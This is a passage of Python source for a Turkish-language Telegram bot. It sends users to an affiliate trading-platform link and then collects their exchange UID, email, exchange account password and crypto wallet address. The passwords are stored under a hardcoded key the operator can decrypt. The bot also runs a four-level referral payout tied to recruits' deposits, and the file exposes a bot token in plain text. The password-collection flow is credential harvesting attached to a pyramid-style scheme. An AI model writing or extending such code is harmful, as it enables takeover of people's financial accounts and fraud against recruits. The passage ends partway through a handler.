"""
Telegram Mini App Bot — Premium Dashboard
Kayıt süreci: Borsa kayıt linki → Doğrulama soruları → Bilgi toplama → Admin onay
Referans ödül sistemi: 4 derinlik seviyesi — yatırım miktarına göre puan dağıtımı
"""

import logging
import asyncio
import sqlite3
import os
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo,
)
from cryptography.fernet import Fernet
from aiohttp import web
from aiohttp import hdrs

# ============================================================
# GÜNLÜKLEME
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
# AYARLAR
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8511141627:AAF9o8BYZcYgaEgI6MRz67ON-S_HDiLXgJE")
ADMIN_GROUP_ID = int(os.environ.get("ADMIN_GROUP_ID", "-1004400949303"))
BORSA_KAYIT_LINKI = "https://u3.shortink.io/smart/DDyeXBli3mtt05"
MIN_WITHDRAW = 50.0

# NGROK ADRESİNİZ (Değişirse burayı güncelleyin)
# Railway'e deploy ederseniz WEB_APP_URL ortam değişkeninden alınır
WEB_APP_URL = os.environ.get("WEB_APP_URL", "https://residence-sardine-professed.ngrok-free.dev")

CIPHER_KEY = b'HNVx7KEG-fZl9y3Y7JGIgHPZHJA2WX0_soRIjwH6Dqk='
cipher_suite = Fernet(CIPHER_KEY)

DB_PATH = "/app/data/veri.db"
BACKUP_DIR = "/app/data/backups"
MAX_BACKUPS = 7

# ============================================================
# REFERANS ÖDÜL ORANLARI (Yatırım miktarına göre)
# ============================================================
# 1. Derinlik: %2
# 2. Derinlik: %1.5
# 3. Derinlik: %1
# 4. Derinlik: %0.5
REF_ORANLARI = {
    1: 0.02,
    2: 0.015,
    3: 0.01,
    4: 0.005,
}


# ============================================================
# VERİTABANI
# ============================================================
def veritabanini_hazirla():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS users (
        telegram_id INTEGER PRIMARY KEY,
        username TEXT,
        invited_by INTEGER,
        status TEXT DEFAULT 'PENDING',
        bakiye REAL DEFAULT 0.0,
        bloke_bakiye REAL DEFAULT 0.0,
        borsa_uid TEXT,
        yatirim_miktari REAL DEFAULT 0.0,
        mail TEXT,
        sifre TEXT,
        cuzdan_adresi TEXT,
        kayit_tarihi TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        onay_tarihi TIMESTAMP
    )""")
    c.execute("""
    CREATE TABLE IF NOT EXISTS cekim_talepleri (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER,
        miktar REAL,
        cuzdan_adresi TEXT,
        durum TEXT DEFAULT 'PENDING',
        talep_tarihi TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        islem_tarihi TIMESTAMP
    )""")
    c.execute("""
    CREATE TABLE IF NOT EXISTS odul_gecmisi (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        odul_verilen_id INTEGER,
        odul_kaynagi_id INTEGER,
        derinlik INTEGER,
        miktar REAL,
        kaynak_yatirim REAL,
        tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )""")
    conn.commit()
    conn.close()
    logger.info("✅ Veritabanı hazır.")


def yedekleme_yap():
    os.makedirs(BACKUP_DIR, exist_ok=True)
    try:
        conn = sqlite3.connect(DB_PATH)
        backup_path = os.path.join(
            BACKUP_DIR,
            f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
        )
        backup_conn = sqlite3.connect(backup_path)
        conn.backup(backup_conn)
        backup_conn.close()
        conn.close()
        logger.info(f"✅ Yedekleme: {backup_path}")
        return True
    except Exception as e:
        logger.error(f"❌ Yedekleme hatası: {e}")
        return False


async def periyodik_yedekleme():
    while True:
        await asyncio.sleep(3600)
        yedekleme_yap()


# ============================================================
# KAYIT SÜRECİ (FSM STATES)
# ============================================================
class KayitSureci(StatesGroup):
    # Doğrulama aşaması
    soru_borsa_kayit = State()       # Soru 1: Borsa kaydınız tamamlandı mı?
    soru_kimlik = State()            # Soru 2: Kimlik doğrulamanız yapıldı mı?
    soru_yatirim = State()           # Soru 3: Yatırım yaptınız mı?
    # Bilgi toplama aşaması
    bekliyor_borsa_uid = State()     # Adım 4: Borsa UID
    bekliyor_yatirim_miktar = State() # Adım 5: Yatırım miktarı
    bekliyor_mail = State()          # Adım 6: E-posta
    bekliyor_sifre = State()         # Adım 7: Borsa şifresi
    bekliyor_cuzdan = State()        # Adım 8: Cüzdan adresi
    bekliyor_onay = State()          # Son: Özet onay


# ============================================================
# REFERANS AĞACI FONKSİYONLARI
# ============================================================
def get_ref_tree(user_id):
    """Kullanıcının referans ağacını derinlik bazlı sayar."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, invited_by FROM users")
    all_users = cursor.fetchall()
    conn.close()
    tree = {1: 0, 2: 0, 3: 0, 4: 0}

    def count_depth(parent_ids, depth):
        if depth > 4 or not parent_ids:
            return
        children = [u[0] for u in all_users if u[1] in parent_ids]
        tree[depth] = len(children)
        count_depth(children, depth + 1)

    count_depth([user_id], 1)
    return tree


def get_ancestors(user_id, max_depth=4):
    """
    Yeni kullanıcının üst zincirini bulur.
    Geri dönüş: [(user_id, derinlik), ...]
    """
    ancestors = []
    current_id = user_id
    depth = 1

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    while depth <= max_depth:
        cursor.execute(
            "SELECT invited_by FROM users WHERE telegram_id = ?",
            (current_id,)
        )
        row = cursor.fetchone()
        if not row or not row[0]:
            break
        parent_id = row[0]
        ancestors.append((parent_id, depth))
        current_id = parent_id
        depth += 1

    conn.close()
    return ancestors


def odul_dagit(yeni_user_id, yeni_user_yatirim):
    """
    Yeni kullanıcı onaylandığında referans zincirindeki 4 derinlik seviyesine
    yatırım miktarına göre ödül dağıtır.

    1. Derinlik: %2
    2. Derinlik: %1.5
    3. Derinlik: %1
    4. Derinlik: %0.5
    """
    ancestors = get_ancestors(yeni_user_id, max_depth=4)

    if not ancestors:
        logger.info(f"🔗 Kullanıcı {yeni_user_id}'nin referans zinciri yok, ödül dağıtılmadı.")
        return []

    dagitilan_oduller = []
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()

    for (parent_id, depth) in ancestors:
        # Bu derinlik için oran
        oran = REF_ORANLARI.get(depth, 0)

        # Ödül miktarı = yatırım * oran
        odul_miktar = yeni_user_yatirim * oran

        if odul_miktar < 0.01:
            continue  # Çok küçük miktar, atla

        # Sadece APPROVED kullanıcılara ödül ver
        cursor.execute(
            "SELECT username, status FROM users WHERE telegram_id = ?",
            (parent_id,)
        )
        parent_row = cursor.fetchone()

        if not parent_row:
            continue

        # Onaylı değilse de ödül ekle — onaylandığında zaten dashboard erişimi var
        # Sadece APPROVED kullanıcıların bakiyesine ekle
        if parent_row[1] != 'APPROVED':
            logger.info(f"⚠️ Referans {parent_id} henüz APPROVED değil, ödül biriktirilmeyecek.")
            continue

        # Bakiyeye ekle
        cursor.execute(
            "UPDATE users SET bakiye = bakiye + ? WHERE telegram_id = ?",
            (odul_miktar, parent_id)
        )

        # Geçmişe kaydet
        cursor.execute(
            """INSERT INTO odul_gecmisi (odul_verilen_id, odul_kaynagi_id, derinlik, miktar, kaynak_yatirim)
            VALUES (?, ?, ?, ?, ?)""",
            (parent_id, yeni_user_id, depth, odul_miktar, yeni_user_yatirim)
        )

        dagitilan_oduller.append({
            'user_id': parent_id,
            'username': parent_row[0],
            'derinlik': depth,
            'oran': oran,
            'miktar': odul_miktar,
        })

    conn.commit()
    conn.close()

    return dagitilan_oduller


def get_history(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT miktar, durum, talep_tarihi FROM cekim_talepleri "
        "WHERE telegram_id = ? ORDER BY talep_tarihi DESC LIMIT 5",
        (user_id,)
    )
    history = [
        {"miktar": r[0], "durum": r[1], "talep_tarihi": r[2]}
        for r in cursor.fetchall()
    ]
    conn.close()
    return history


# ============================================================
# CORS MIDDLEWARE
# ============================================================
@web.middleware
async def cors_middleware(request, handler):
    if request.method == "OPTIONS":
        return web.Response(
            headers={
                hdrs.ACCESS_CONTROL_ALLOW_ORIGIN: "*",
                hdrs.ACCESS_CONTROL_ALLOW_METHODS: "GET, POST, OPTIONS",
                hdrs.ACCESS_CONTROL_ALLOW_HEADERS: "Content-Type, Authorization",
            }
        )
    response = await handler(request)
    response.headers[hdrs.ACCESS_CONTROL_ALLOW_ORIGIN] = "*"
    return response


# ============================================================
# API SUNUCUSU
# ============================================================
async def handle_user_data(request):
    try:
        user_id = int(request.match_info['user_id'])
    except (ValueError, KeyError):
        return web.json_response({"success": False, "message": "Geçersiz ID."}, status=400)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (user_id,))
    user = cursor.fetchone()
    conn.close()

    if not user:
        return web.json_response({"success": False, "message": "Kullanıcı bulunamadı."}, status=404)

    tree = get_ref_tree(user_id)
    history = get_history(user_id)
    bot_info = await bot.get_me()

    return web.json_response({
        "success": True,
        "user": {
            "id": user[0],
            "username": user[1],
            "status": user[3],
            "bakiye": user[4],
            "bloke_bakiye": user[5],
            "cuzdan": user[10],
            "ref_tree": tree,
            "history": history,
            "bot_username": bot_info.username,
        }
    })


async def handle_withdraw(request):
    try:
        data = await request.json()
        user_id = int(data['user_id'])
        amount = float(data['amount'])
    except (ValueError, KeyError, TypeError) as e:
        return web.json_response({"success": False, "message": f"Geçersiz veri: {e}"}, status=400)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT bakiye, cuzdan_adresi, status FROM users WHERE telegram_id = ?",
        (user_id,)
    )
    res = cursor.fetchone()

    if not res:
        conn.close()
        return web.json_response({"success": False, "message": "Kullanıcı bulunamadı."}, status=404)
    if res[2] != 'APPROVED':
        conn.close()
        return web.json_response({"success": False, "message": "Hesabınız henüz onaylanmamış."}, status=403)
    if amount < MIN_WITHDRAW:
        conn.close()
        return web.json_response({"success": False, "message": f"Minimum çekim: {MIN_WITHDRAW} PUAN."}, status=400)
    if amount > res[0]:
        conn.close()
        return web.json_response({"success": False, "message": "Yetersiz bakiye."}, status=400)

    cursor.execute(
        "UPDATE users SET bakiye = bakiye - ?, bloke_bakiye = bloke_bakiye + ? WHERE telegram_id = ?",
        (amount, amount, user_id)
    )
    cursor.execute(
        "INSERT INTO cekim_talepleri (telegram_id, miktar, cuzdan_adresi) VALUES (?, ?, ?)",
        (user_id, amount, res[1])
    )
    conn.commit()
    conn.close()

    try:
        await bot.send_message(
            ADMIN_GROUP_ID,
            f"💸 <b>ÇEKİM TALEBİ</b>\n"
            f"👤 ID: <code>{user_id}</code>\n"
            f"💰 Miktar: <b>{amount}</b> PUAN\n"
            f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Admin bildirimi hatası: {e}")

    return web.json_response({"success": True, "message": "Talep oluşturuldu."})


async def handle_wallet(request):
    try:
        data = await request.json()
        user_id = int(data['user_id'])
        wallet = str(data['wallet']).strip()
    except (ValueError, KeyError, TypeError) as e:
        return web.json_response({"success": False, "message": f"Geçersiz veri: {e}"}, status=400)

    if not wallet or len(wallet) < 10:
        return web.json_response({"success": False, "message": "Geçerli bir cüzdan adresi giriniz."}, status=400)

    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET cuzdan_adresi = ? WHERE telegram_id = ?", (wallet, user_id))
    conn.commit()
    conn.close()

    return web.json_response({"success": True, "message": "Cüzdan güncellendi."})


def create_web_app():
    app = web.Application(middlewares=[cors_middleware])
    current_dir = os.path.dirname(os.path.abspath(__file__))
    web_dir = os.path.join(current_dir, 'web')

    app.router.add_static('/web/', web_dir, name='web', show_index=False)
    app.router.add_get('/', lambda r: web.FileResponse(os.path.join(web_dir, 'index.html')))
    app.router.add_get('/api/user/{user_id}', handle_user_data)
    app.router.add_post('/api/withdraw', handle_withdraw)
    app.router.add_post('/api/wallet', handle_wallet)

    return app


# ============================================================
# BOT MANTIĞI
# ============================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()


# --- Yardımcı Fonksiyonlar ---
def kullanici_onayli(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT status FROM users WHERE telegram_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row is not None and row[0] == 'APPROVED'


def kullanici_getir(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE telegram_id = ?", (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user


def ana_menu_klavyesi(user_id):
    user = kullanici_getir(user_id)

    if not user:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✍️ Kayıt Ol", callback_data="kayit_basla")]
        ])

    status = user[3]

    if status == 'APPROVED':
        web_app = WebAppInfo(url=WEB_APP_URL)
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 PREMIUM DASHBOARD", web_app=web_app)],
            [InlineKeyboardButton(text="👤 Profilim", callback_data="menu_profil")],
            [InlineKeyboardButton(text="👥 Referanslarım", callback_data="menu_ref_tree")],
        ])

    elif status == 'PENDING':
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⏳ Onayınız Bekleniyor...", callback_data="bekle")],
            [InlineKeyboardButton(text="👤 Profilim", callback_data="menu_profil")],
        ])

    elif status == 'REJECTED':
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Yeniden Kayıt Ol", callback_data="kayit_basla")],
        ])

    else:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚠️ Hesabınız Kontrol Ediliyor", callback_data="bekle")],
        ])


# --- /start KOMUTU (referans parametresi ile) ---
@router.message(Command("start"))
async def start_komutu(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Bilinmiyor"

    # Referans parametresini al: start=ref_12345
    invited_by = None
    try:
        args = message.text.split()  # /start ref_12345 -> ['start', 'ref_12345']
        if len(args) > 1:
            ref_text = args[1]  # ref_12345
            ref_match = re.search(r'ref_(\d+)', ref_text)
            if ref_match:
                invited_by = int(ref_match.group(1))
                # Kendi referans linkiyle kayıt olamaz
                if invited_by == user_id:
                    invited_by = None
    except (ValueError, TypeError, IndexError):
        pass

    # FSM'e referans bilgisini kaydet
    if invited_by:
        await state.update_data(invited_by=invited_by)

    user = kullanici_getir(user_id)

    if not user:
        ref_msg = ""
        if invited_by:
            ref_msg = f"🔗 Referans bağlantınızla geldiniz!\n"

        await message.answer(
            f"👋 Merhaba <b>{username}</b>!\n\n"
            f"{ref_msg}"
            f"Premium Dashboard'a hoş geldiniz.\n\n"
            f"Kayıt olmak için aşağıdaki adımları tamamlamanız gerekiyor:\n\n"
            f"1️⃣ Borsa kayıt linkinden hesap oluşturun\n"
            f"2️⃣ Kimlik doğrulamanızı tamamlayın\n"
            f"3️⃣ Hesabınıza yatırım yapın\n"
            f"4️⃣ Bilgilerinizi girin\n"
            f"5️⃣ Yönetici onayı alın\n\n"
            f"<b>Başlamak için aşağıdaki butona tıklayın:</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✍️ Kayıt İşlemine Başla", callback_data="kayit_basla")]
            ])
        )
    else:
        status = user[3]

        if status == 'APPROVED':
            await message.answer(
                f"💎 <b>Premium Panel Aktif!</b>\n\n"
                f"Aşağıdaki butondan panelinizi açabilirsiniz.",
                parse_mode="HTML",
                reply_markup=ana_menu_klavyesi(user_id)
            )
        elif status == 'PENDING':
            await message.answer(
                f"⏳ <b>Onayınız Bekleniyor</b>\n\n"
                f"Kayıt bilgileriniz yönetici tarafından inceleniyor.\n"
                f"Onay aldığınızda dashboard'a erişebileceksiniz.\n\n"
                f"İşlem süresi: 24-48 saat.",
                parse_mode="HTML",
                reply_markup=ana_menu_klavyesi(user_id)
            )
        elif status == 'REJECTED':
            await message.answer(
                f"❌ <b>Kaydınız Reddedildi</b>\n\n"
                f"Yeni bilgilerle tekrar kayıt olabilirsiniz.",
                parse_mode="HTML",
                reply_markup=ana_menu_klavyesi(user_id)
            )
        else:
            await message.answer(
                "⚠️ Hesabınız kontrol ediliyor.",
                parse_mode="HTML",
                reply_markup=ana_menu_klavyesi(user_id)
            )


# ============================================================
# KAYIT SÜRECİ — BAŞLANGIÇ
# ============================================================
@router.callback_query(F.data == "kayit_basla")
async def kayit_basla(callback: CallbackQuery, state: FSMContext):
    """Kayıt sürecini başlat — Borsa kayıt linki ile."""
    # Mevcut FSM verilerini koru (invited_by gibi)
    current_data = await state.get_data()
    await state.clear()
    user_id = callback.from_user.id

    # Önceki verileri geri yükle (invited_by dahil)
    if 'invited_by' in current_data:
        await state.update_data(invited_by=current_data['invited_by'])

    # Onaylı kullanıcı kayıt yapamaz
    if kullanici_onayli(user_id):
        await callback.answer("✅ Hesabınız zaten onaylı!", show_alert=True)
        return

    # FSM verileri
    await state.update_data(
        telegram_id=user_id,
        username=callback.from_user.username or "Bilinmiyor",
    )

    # Referans bilgisini kontrol et
    ref_info = ""
    if current_data.get('invited_by'):
        ref_info = f"\n🔗 Referans: <code>ID {current_data['invited_by']}</code>"

    # BORSA KAYIT LİNKİ
    await callback.message.answer(
        f"🏦 <b>Adım 1/8 — Borsa Kayıt</b>\n\n"
        f"Aşağıdaki linkten borsa hesabınızı oluşturun:\n\n"
        f"🔗 <a href=\"{BORSA_KAYIT_LINKI}\">Borsa Kayıt Linki</a>{ref_info}\n\n"
        f"Kayıt işlemini tamamladıktan sonra aşağıdan onaylayın.\n\n"
        f"<i>⚠️ Link üzerinden kayıt yapmanız önemlidir!</i>",
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Borsa Kaydımı Tamamladım", callback_data="kayit_borsa_evet")],
            [InlineKeyboardButton(text="❌ Henüz Tamamlamadım", callback_data="kayit_borsa_hayir")],
        ])
    )
    await state.set_state(KayitSureci.soru_borsa_kayit)
    await callback.answer()


# --- SORU 1: BORSA KAYDI TAMAMLANDI MI? ---
@router.callback_query(KayitSureci.soru_borsa_kayit, F.data == "kayit_borsa_evet")
async def borsa_kayit_evet(callback: CallbackQuery, state: FSMContext):
    """Borsa kaydı tamamlandı → SORU 2'ye geç."""
    await state.update_data(borsa_kayit="tamamlandi")

    await callback.message.edit_text(
        f"✅ <b>Borsa Kaydı:</b> Tamamlandı\n\n"
        f"🏦 <b>Adım 2/8 — Kimlik Doğrulama</b>\n\n"
        f"Borsa hesabınızda kimlik doğrulamanızı (KYC) tamamladınız mı?\n\n"
        f"<i>Kimlik doğrulaması hesabınızın güvenliği için zorunludur.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Evet, Yapıldı", callback_data="kayit_kimlik_evet")],
            [InlineKeyboardButton(text="❌ Hayır, Yapılmadı", callback_data="kayit_kimlik_hayir")],
        ])
    )
    await state.set_state(KayitSureci.soru_kimlik)
    await callback.answer()


@router.callback_query(KayitSureci.soru_borsa_kayit, F.data == "kayit_borsa_hayir")
async def borsa_kayit_hayir(callback: CallbackQuery):
    """Borsa kaydı henüz tamamlanmadı."""
    await callback.message.edit_text(
        f"⚠️ <b>Önce Borsa Kaydını Tamamlayın</b>\n\n"
        f"Aşağıdaki linkten borsa hesabınızı oluşturun:\n\n"
        f"🔗 <a href=\"{BORSA_KAYIT_LINKI}\">Borsa Kayıt Linki</a>\n\n"
        f"Kayıt tamamlandıktan sonra tekrar onaylayın.",
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Borsa Kaydımı Tamamladım", callback_data="kayit_borsa_evet")],
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")],
        ])
    )
    await callback.answer("Borsa kaydı tamamlanmalıdır.")


# --- SORU 2: KİMLİK DOĞRULAMA ---
@router.callback_query(KayitSureci.soru_kimlik, F.data == "kayit_kimlik_evet")
async def kimlik_evet(callback: CallbackQuery, state: FSMContext):
    """Kimlik doğrulama tamamlandı → SORU 3'e geç."""
    await state.update_data(kimlik="yapildi")

    await callback.message.edit_text(
        f"✅ <b>Kimlik Doğrulama:</b> Yapıldı\n\n"
        f"🏦 <b>Adım 3/8 — Yatırım Onayı</b>\n\n"
        f"Borsa hesabınıza yatırım (para yatırma) yaptınız mı?\n\n"
        f"<i>Hesabınızda aktif bakiye bulunması gerekmektedir.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Evet, Yaptım", callback_data="kayit_yatirim_evet")],
            [InlineKeyboardButton(text="❌ Hayır, Yapmadım", callback_data="kayit_yatirim_hayir")],
        ])
    )
    await state.set_state(KayitSureci.soru_yatirim)
    await callback.answer()


@router.callback_query(KayitSureci.soru_kimlik, F.data == "kayit_kimlik_hayir")
async def kimlik_hayir(callback: CallbackQuery):
    """Kimlik doğrulama henüz yapılmadı."""
    await callback.message.edit_text(
        f"⚠️ <b>Kimlik Doğrulamanız Gerekiyor</b>\n\n"
        f"Borsa hesabınızda kimlik doğrulamanızı (KYC) tamamlamanız zorunludur.\n\n"
        f"🔗 <a href=\"{BORSA_KAYIT_LINKI}\">Borsa Hesabınız</a>\n\n"
        f"Kimlik doğrulaması yapıldıktan sonra tekrar onaylayın.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Kimlik Doğruladım", callback_data="kayit_kimlik_evet")],
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")],
        ])
    )
    await callback.answer("Kimlik doğrulama zorunludur.")


# --- SORU 3: YATIRIM YAPILDI MI? ---
@router.callback_query(KayitSureci.soru_yatirim, F.data == "kayit_yatirim_evet")
async def yatirim_evet(callback: CallbackQuery, state: FSMContext):
    """Yatırım yapıldı → Bilgi toplama aşamasına geç (Adım 4)."""
    await state.update_data(yatirim_yapildi="evet")

    await callback.message.edit_text(
        f"✅ <b>Yatırım:</b> Yapıldı\n\n"
        f"─────────────────────\n"
        f"✅ Doğrulama tamamlandı!\n"
        f"─────────────────────\n\n"
        f"📝 <b>Adım 4/8 — Borsa UID</b>\n\n"
        f"📌 <b>Borsa UID'nizi</b> giriniz.\n\n"
        f"⚠️ Bu bilgiyi doğru girdiğinizden emin olun.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")]
        ])
    )
    await state.set_state(KayitSureci.bekliyor_borsa_uid)
    await callback.answer()


@router.callback_query(KayitSureci.soru_yatirim, F.data == "kayit_yatirim_hayir")
async def yatirim_hayir(callback: CallbackQuery):
    """Yatırım henüz yapılmadı."""
    await callback.message.edit_text(
        f"⚠️ <b>Hesabınıza Yatırım Yapmanız Gerekiyor</b>\n\n"
        f"Borsa hesabınıza yatırım (para yatırma) yapmanız zorunludur.\n\n"
        f"🔗 <a href=\"{BORSA_KAYIT_LINKI}\">Borsa Hesabınız</a>\n\n"
        f"Yatırım yaptıktan sonra tekrar onaylayın.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Yatırım Yaptım", callback_data="kayit_yatirim_evet")],
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")],
        ])
    )
    await callback.answer("Yatırım yapmanız gerekmektedir.")


# ============================================================
# BİLGİ TOPLAMA AŞAMASI
# ============================================================

# --- Adım 4: BORSA UID ---
@router.message(KayitSureci.bekliyor_borsa_uid)
async def bolsa_uid_al(message: Message, state: FSMContext):
    uid = message.text.strip()
    if not uid or len(uid) < 3:
        await message.answer("⚠️ Geçerli bir Borsa UID giriniz (en az 3 karakter).")
        return

    await state.update_data(borsa_uid=uid)

    await message.answer(
        f"✅ <b>Borsa UID:</b> {uid}\n\n"
        f"📝 <b>Adım 5/8 — Yatırım Miktarı</b>\n\n"
        f"💰 <b>Yatırım miktarınızı</b> giriniz (USDT olarak).\n\n"
        f"💡 Örnek: 100, 500, 1000",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")]
        ])
    )
    await state.set_state(KayitSureci.bekliyor_yatirim_miktar)


# --- Adım 5: YATIRIM MİKTARI ---
@router.message(KayitSureci.bekliyor_yatirim_miktar)
async def yatirim_miktari_al(message: Message, state: FSMContext):
    text = message.text.strip().replace(',', '.')
    try:
        miktar = float(text)
    except ValueError:
        await message.answer("⚠️ Geçerli bir miktar giriniz. Örnek: 100")
        return

    if miktar < 10:
        await message.answer("⚠️ Minimum yatırım miktarı 10 USDT'dir.")
        return

    await state.update_data(yatirim_miktari=miktar)

    await message.answer(
        f"✅ <b>Yatırım Miktarı:</b> {miktar:.2f} USDT\n\n"
        f"📝 <b>Adım 6/8 — E-posta</b>\n\n"
        f"📧 <b>E-posta adresinizi</b> giriniz.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")]
        ])
    )
    await state.set_state(KayitSureci.bekliyor_mail)


# --- Adım 6: E-POSTA ---
@router.message(KayitSureci.bekliyor_mail)
async def mail_al(message: Message, state: FSMContext):
    mail = message.text.strip()
    if not mail or '@' not in mail or '.' not in mail:
        await message.answer("⚠️ Geçerli bir e-posta adresi giriniz. Örnek: isim@mail.com")
        return

    await state.update_data(mail=mail)

    await message.answer(
        f"✅ <b>E-posta:</b> {mail}\n\n"
        f"📝 <b>Adım 7/8 — Borsa Şifresi</b>\n\n"
        f"🔑 <b>Borsa şifrenizi</b> giriniz.\n\n"
        f"🔒 Bu bilgi şifreli olarak saklanır.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")]
        ])
    )
    await state.set_state(KayitSureci.bekliyor_sifre)


# --- Adım 7: ŞİFRE ---
@router.message(KayitSureci.bekliyor_sifre)
async def sifre_al(message: Message, state: FSMContext):
    sifre = message.text.strip()
    if not sifre or len(sifre) < 4:
        await message.answer("⚠️ Şifre en az 4 karakter olmalıdır.")
        return

    sifreli = cipher_suite.encrypt(sifre.encode()).decode()
    await state.update_data(sifre=sifreli)

    await message.answer(
        f"✅ <b>Borsa şifresi kaydedildi.</b>\n\n"
        f"📝 <b>Adım 8/8 — Cüzdan Adresi</b>\n\n"
        f"🔗 <b>USDT TRC20 cüzdan adresinizi</b> giriniz.\n\n"
        f"💡 Bu adrese ödüller gönderilecektir.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")]
        ])
    )
    await state.set_state(KayitSureci.bekliyor_cuzdan)


# --- Adım 8: CÜZDAN ADRESİ → ÖZET ---
@router.message(KayitSureci.bekliyor_cuzdan)
async def cuzdan_al(message: Message, state: FSMContext):
    cuzdan = message.text.strip()
    if not cuzdan or len(cuzdan) < 25:
        await message.answer("⚠️ Geçerli bir USDT TRC20 adresi giriniz (TR ile başlar).")
        return

    data = await state.get_data()
    await state.update_data(cuzdan_adresi=cuzdan)

    # Borsa kayıt bilgilerini özetle
    borsa_kayit = "✅ Tamamlandı" if data.get('borsa_kayit') else "❌"
    kimlik = "✅ Yapıldı" if data.get('kimlik') else "❌"
    yatirim = "✅ Yapıldı" if data.get('yatirim_yapildi') == 'evet' else "❌"

    # Referans bilgisini göster
    ref_info = ""
    if data.get('invited_by'):
        ref_info = f"🔗 Referans: <code>ID {data['invited_by']}</code>\n"

    await message.answer(
        f"📋 <b>Kayıt Özeti</b>\n\n"
        f"<b>Doğrulama Adımları:</b>\n"
        f"🏦 Borsa Kayıt: {borsa_kayit}\n"
        f"🆔 Kimlik Doğrulama: {kimlik}\n"
        f"💰 Yatırım: {yatirim}\n\n"
        f"<b>Bilgiler:</b>\n"
        f"{ref_info}"
        f"🆔 Borsa UID: <code>{data.get('borsa_uid', '—')}</code>\n"
        f"💰 Yatırım: <b>{data.get('yatirim_miktari', 0):.2f}</b> USDT\n"
        f"📧 E-posta: <code>{data.get('mail', '—')}</code>\n"
        f"🔗 Cüzdan: <code>{cuzdan}</code>\n\n"
        f"✅ Bilgileriniz doğruysa onaylayın.\n"
        f"❌ Yanlışsa iptal edip yeniden deneyin.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Onaylıyorum, Kaydet", callback_data="kayit_onayla")],
            [InlineKeyboardButton(text="❌ İptal", callback_data="kayit_iptal")],
        ])
    )
    await state.set_state(KayitSureci.bekliyor_onay)


# --- KAYIT ONAYLA ---
@router.callback_query(KayitSureci.bekliyor_onay, F.data == "kayit_onayla")
